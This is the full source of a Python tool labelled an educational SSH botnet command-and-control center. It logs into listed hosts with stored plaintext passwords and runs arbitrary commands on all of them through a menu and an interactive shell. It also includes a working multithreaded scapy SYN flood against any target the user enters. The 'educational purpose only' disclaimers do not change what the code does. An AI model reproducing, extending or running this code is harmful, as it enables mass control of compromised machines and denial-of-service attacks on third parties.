#!/usr/bin/env python3
"""
SSH Botnet - Command & Control Center
By Inlighn Tech
Educational Purpose Only

WARNING: This script is for educational purposes only.
Unauthorized access to systems is illegal and unethical.
Only use on systems you own or have explicit permission to test.
"""

import os
import sys
import json
import time
import threading
import socket
import argparse
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import subprocess

# Third-party imports
try:
    from pexpect import pxssh
    import paramiko
    from scapy.all import IP, TCP, send
except ImportError as e:
    print(f"[!] Missing required module: {e}")
    print("[*] Install required modules:")
    print("    pip install pexpect paramiko scapy")
    sys.exit(1)

class SSHBotnet:
    """SSH Botnet Controller Implementation"""
    
    def __init__(self, config_file: str = "botnet.json"):
        self.config_file = config_file
        self.bots: List[Dict] = []
        self.active_sessions: List[pxssh.pxssh] = []
        self.running = True
        self.lock = threading.Lock()
        self.attack_threads = []
        
        # Load saved bots
        self.load_bots()
        
        # ANSI color codes for output
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'reset': '\033[0m'
        }
    
    def load_bots(self) -> None:
        """Load bots from JSON configuration file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    data = json.load(f)
                    self.bots = data.get('bots', [])
                    print(f"[*] Loaded {len(self.bots)} bots from {self.config_file}")
            except Exception as e:
                print(f"[!] Error loading bots: {e}")
    
    def save_bots(self) -> None:
        """Save bots to JSON configuration file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump({'bots': self.bots, 'timestamp': datetime.now().isoformat()}, 
                         f, indent=2)
            print(f"[+] Botnet saved to {self.config_file}")
        except Exception as e:
            print(f"[!] Error saving bots: {e}")
    
    def connect_bot(self, bot: Dict) -> Optional[pxssh.pxssh]:
        """Connect to a single bot via SSH"""
        try:
            session = pxssh.pxssh()
            session.login(
                bot['host'],
                bot['username'],
                bot['password'],
                port=bot.get('port', 22),
                login_timeout=10
            )
            session.sendline('echo "Connected"')
            session.prompt(timeout=5)
            
            # Update bot status
            bot['status'] = 'online'
            bot['last_connected'] = datetime.now().isoformat()
            
            return session
            
        except Exception as e:
            bot['status'] = 'offline'
            bot['error'] = str(e)
            return None
    
    def connect_all_bots(self) -> None:
        """Connect to all bots in the botnet"""
        print("[*] Connecting to all bots...")
        
        self.active_sessions = []
        for i, bot in enumerate(self.bots):
            print(f"  [*] Connecting to {bot['host']}...", end=' ')
            session = self.connect_bot(bot)
            if session:
                self.active_sessions.append(session)
                print(f"{self.colors['green']}OK{self.colors['reset']}")
            else:
                print(f"{self.colors['red']}FAILED{self.colors['reset']}")
        
        print(f"[+] Connected to {len(self.active_sessions)}/{len(self.bots)} bots")
    
    def disconnect_all(self) -> None:
        """Disconnect all bot sessions"""
        for session in self.active_sessions:
            try:
                session.logout()
            except:
                pass
        self.active_sessions = []
        print("[*] All bots disconnected")
    
    def execute_command(self, command: str, bot_index: Optional[int] = None) -> List[Dict]:
        """Execute command on bots"""
        results = []
        
        # If bot_index specified, execute on single bot
        if bot_index is not None:
            if 0 <= bot_index < len(self.active_sessions):
                results = [self.execute_on_bot(self.active_sessions[bot_index], command, bot_index)]
            else:
                print("[!] Invalid bot index")
            return results
        
        # Execute on all bots
        print(f"\n[*] Executing command on {len(self.active_sessions)} bots: {command}\n")
        
        threads = []
        for i, session in enumerate(self.active_sessions):
            thread = threading.Thread(
                target=self.execute_on_bot,
                args=(session, command, i),
                daemon=True
            )
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        return results
    
    def execute_on_bot(self, session: pxssh.pxssh, command: str, index: int) -> Dict:
        """Execute command on a single bot"""
        result = {
            'bot_index': index,
            'command': command,
            'output': '',
            'error': None,
            'status': 'success'
        }
        
        try:
            session.sendline(command)
            session.prompt(timeout=10)
            output = session.before.decode('utf-8', errors='ignore')
            
            # Clean up output
            output = output.replace(command, '').strip()
            if output:
                result['output'] = output
            
            # Display output
            print(f"\n{self.colors['cyan']}Bot {index}: {self.bots[index]['host']}{self.colors['reset']}")
            print(f"{self.colors['green']}Output:{self.colors['reset']}")
            if output:
                for line in output.split('\n'):
                    print(f"  {line}")
            else:
                print("  (no output)")
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
            print(f"\n{self.colors['red']}Bot {index}: ERROR - {e}{self.colors['reset']}")
        
        return result
    
    def interactive_shell(self) -> None:
        """Open an interactive shell for command execution"""
        if not self.active_sessions:
            print("[!] No active bot sessions")
            return
        
        print(f"\n{self.colors['yellow']}[*] Interactive Shell Mode")
        print("[*] Type 'exit' to return to main menu")
        print("[*] Commands will be executed on all bots")
        print("[*] Use 'bot <index>' to target specific bot")
        print(f"[*] Active bots: {len(self.active_sessions)}{self.colors['reset']}\n")
        
        while self.running:
            try:
                # Get user input
                cmd = input(f"{self.colors['cyan']}shell> {self.colors['reset']}").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() == 'exit':
                    break
                
                if cmd.lower().startswith('bot '):
                    try:
                        bot_idx = int(cmd.split()[1])
                        if 0 <= bot_idx < len(self.active_sessions):
                            # Execute on specific bot
                            self.execute_command(cmd[4:], bot_idx)
                        else:
                            print(f"[!] Invalid bot index. Use 0-{len(self.active_sessions)-1}")
                    except ValueError:
                        print("[!] Invalid bot index format")
                    continue
                
                # Execute on all bots
                self.execute_command(cmd)
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def add_bot(self) -> None:
        """Add a new bot to the botnet"""
        print("\n" + "=" * 40)
        print("ADD NEW BOT")
        print("=" * 40)
        
        try:
            host = input("Enter bot IP/hostname: ").strip()
            port = input("Enter SSH port (default 22): ").strip()
            port = int(port) if port else 22
            
            username = input("Enter SSH username: ").strip()
            password = input("Enter SSH password: ").strip()
            
            # Test connection
            print(f"\n[*] Testing connection to {host}:{port}...")
            test_bot = {
                'host': host,
                'port': port,
                'username': username,
                'password': password
            }
            
            session = self.connect_bot(test_bot)
            if session:
                session.logout()
                print(f"{self.colors['green']}[+] Connection successful!{self.colors['reset']}")
                
                # Add to botnet
                bot_entry = {
                    'host': host,
                    'port': port,
                    'username': username,
                    'password': password,
                    'added': datetime.now().isoformat(),
                    'status': 'online'
                }
                self.bots.append(bot_entry)
                self.save_bots()
                
                # Connect to the new bot
                new_session = self.connect_bot(bot_entry)
                if new_session:
                    self.active_sessions.append(new_session)
                
                print(f"[+] Bot added successfully!")
            else:
                print(f"{self.colors['red']}[!] Connection failed{self.colors['reset']}")
                
        except Exception as e:
            print(f"[!] Error adding bot: {e}")
    
    def list_bots(self) -> None:
        """Display list of all bots in the botnet"""
        print("\n" + "=" * 60)
        print("BOTNET STATUS")
        print("=" * 60)
        
        if not self.bots:
            print("[!] No bots in botnet")
            return
        
        print(f"{'ID':<4} {'Host':<20} {'User':<15} {'Status':<10} {'Last Connected'}")
        print("-" * 60)
        
        for i, bot in enumerate(self.bots):
            status_color = self.colors['green'] if bot.get('status') == 'online' else self.colors['red']
            status = bot.get('status', 'unknown')
            last = bot.get('last_connected', 'never')[:19]
            
            print(f"{i:<4} {bot['host']:<20} {bot['username']:<15} "
                  f"{status_color}{status:<10}{self.colors['reset']} {last}")
        
        print("\n" + "=" * 60)
        print(f"Total bots: {len(self.bots)}")
        print(f"Active sessions: {len(self.active_sessions)}")
    
    def remove_bot(self) -> None:
        """Remove a bot from the botnet"""
        self.list_bots()
        
        try:
            bot_id = input("\nEnter bot ID to remove (or 'all'): ").strip()
            
            if bot_id.lower() == 'all':
                confirm = input("[!] Remove ALL bots? (y/N): ").strip()
                if confirm.lower() == 'y':
                    self.bots.clear()
                    self.active_sessions.clear()
                    self.save_bots()
                    print("[+] All bots removed")
                return
            
            bot_id = int(bot_id)
            if 0 <= bot_id < len(self.bots):
                removed = self.bots.pop(bot_id)
                
                # Remove active session if exists
                if bot_id < len(self.active_sessions):
                    try:
                        self.active_sessions[bot_id].logout()
                    except:
                        pass
                    self.active_sessions.pop(bot_id)
                
                self.save_bots()
                print(f"[+] Bot {removed['host']} removed")
            else:
                print("[!] Invalid bot ID")
                
        except ValueError:
            print("[!] Invalid input")
    
    def start_ddos_attack(self) -> None:
        """Start a DDoS attack simulation"""
        print("\n" + "=" * 40)
        print("DDoS ATTACK - SYN Flood Simulation")
        print("=" * 40)
        print(f"{self.colors['red']}[!] WARNING: This is a simulation for educational purposes{self.colors['reset']}")
        print("[!] Only use on systems you own or have permission to test")
        
        target = input("\nEnter target IP/hostname: ").strip()
        if not target:
            print("[!] No target specified")
            return
        
        try:
            port = int(input("Enter target port (default 80): ").strip() or "80")
            count = int(input("Number of packets (default 100): ").strip() or "100")
            threads = int(input("Number of attack threads (default 4): ").strip() or "4")
            
            print(f"\n[*] Starting SYN flood attack on {target}:{port}")
            print(f"[*] Packets: {count}, Threads: {threads}")
            
            # Start attack threads
            self.attack_threads = []
            for i in range(threads):
                thread = threading.Thread(
                    target=self.syn_flood,
                    args=(target, port, count // threads),
                    daemon=True
                )
                self.attack_threads.append(thread)
                thread.start()
            
            print("[+] Attack started! Press Enter to stop...")
            input()
            
            # Stop attack
            self.stop_attack()
            
        except ValueError:
            print("[!] Invalid input")
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def syn_flood(self, target: str, port: int, count: int) -> None:
        """Send SYN packets for flooding"""
        try:
            # Resolve target IP
            target_ip = socket.gethostbyname(target)
            
            print(f"[*] Thread attacking {target_ip}:{port}")
            
            for _ in range(count):
                # Create SYN packet
                ip_layer = IP(dst=target_ip)
                tcp_layer = TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags='S',
                    seq=random.randint(1000, 9999)
                )
                packet = ip_layer / tcp_layer
                
                # Send packet
                send(packet, verbose=0)
                
                # Small delay to avoid overwhelming the system
                time.sleep(0.001)
                
        except Exception as e:
            print(f"[!] Attack thread error: {e}")
    
    def stop_attack(self) -> None:
        """Stop all DDoS attack threads"""
        print("[*] Stopping attack...")
        # Clean way to stop threads is to use a flag
        # For this implementation, we'll just let threads finish
        self.attack_threads.clear()
        print("[+] Attack stopped")
    
    def export_botnet(self) -> None:
        """Export botnet information"""
        filename = f"botnet_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        export_data = {
            'timestamp': datetime.now().isoformat(),
            'total_bots': len(self.bots),
            'bots': self.bots,
            'active_sessions': len(self.active_sessions)
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(export_data, f, indent=2)
            print(f"[+] Botnet exported to {filename}")
        except Exception as e:
            print(f"[!] Export error: {e}")
    
    def show_menu(self) -> None:
        """Display main menu"""
        print("\n" + "=" * 60)
        print("SSH BOTNET - Command & Control Center")
        print(f"By Inlighn Tech")
        print(f"Active Bots: {self.colors['green']}{len(self.active_sessions)}{self.colors['reset']}/{len(self.bots)}")
        print("=" * 60)
        print("\n[1] List Bots")
        print("[2] Execute Command")
        print("[3] Interactive Shell")
        print("[4] Add Bot")
        print("[5] Remove Bot")
        print("[6] Reconnect All Bots")
        print("[7] DDoS Attack (SYN Flood)")
        print("[8] Export Botnet")
        print("[9] Save Botnet")
        print("[0] Exit")
        print("-" * 60)
    
    def run(self) -> None:
        """Main botnet controller loop"""
        print("\n" + "=" * 60)
        print("SSH BOTNET CONTROLLER")
        print("By Inlighn Tech")
        print("=" * 60)
        
        # Connect to saved bots
        if self.bots:
            print(f"[*] Found {len(self.bots)} saved bots")
            connect = input("[*] Connect to saved bots? (Y/n): ").strip().lower()
            if connect != 'n':
                self.connect_all_bots()
        
        while self.running:
            try:
                self.show_menu()
                choice = input("\nSelect option: ").strip()
                
                if choice == '0':
                    self.disconnect_all()
                    self.save_bots()
                    self.running = False
                    print("[*] Goodbye!")
                    break
                
                elif choice == '1':
                    self.list_bots()
                
                elif choice == '2':
                    command = input("Enter command to execute: ").strip()
                    if command:
                        if not self.active_sessions:
                            print("[!] No active bot sessions")
                            continue
                        self.execute_command(command)
                
                elif choice == '3':
                    if not self.active_sessions:
                        print("[!] No active bot sessions")
                        continue
                    self.interactive_shell()
                
                elif choice == '4':
                    self.add_bot()
                
                elif choice == '5':
                    self.remove_bot()
                
                elif choice == '6':
                    self.connect_all_bots()
                
                elif choice == '7':
                    self.start_ddos_attack()
                
                elif choice == '8':
                    self.export_botnet()
                
                elif choice == '9':
                    self.save_bots()
                
                else:
                    print("[!] Invalid option")
                
                if choice not in ['3', '7']:  # Don't wait if in interactive mode
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                self.running = False
                self.disconnect_all()
                self.save_bots()
                print("\n[*] Botnet terminated")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(1)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="SSH Botnet Controller",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--config", default="botnet.json", help="Configuration file")
    parser.add_argument("--add", action="store_true", help="Add a bot directly")
    parser.add_argument("--host", help="Bot hostname/IP")
    parser.add_argument("--user", help="SSH username")
    parser.add_argument("--passwd", help="SSH password")
    
    args = parser.parse_args()
    
    botnet = SSHBotnet(args.config)
    
    if args.add:
        if not all([args.host, args.user, args.passwd]):
            print("[!] Missing arguments for adding bot")
            print("    Required: --host --user --passwd")
            sys.exit(1)
        
        bot = {
            'host': args.host,
            'port': 22,
            'username': args.user,
            'password': args.passwd,
            'added': datetime.now().isoformat()
        }
        
        print(f"[*] Testing connection to {bot['host']}...")
        session = botnet.connect_bot(bot)
        if session:
            session.logout()
            botnet.bots.append(bot)
            botnet.save_bots()
            print("[+] Bot added successfully")
            sys.exit(0)
        else:
            print("[!] Failed to connect to bot")
            sys.exit(1)
    
    botnet.run()

if __name__ == "__main__":
    # Import random for SYN flood
    import random
    main()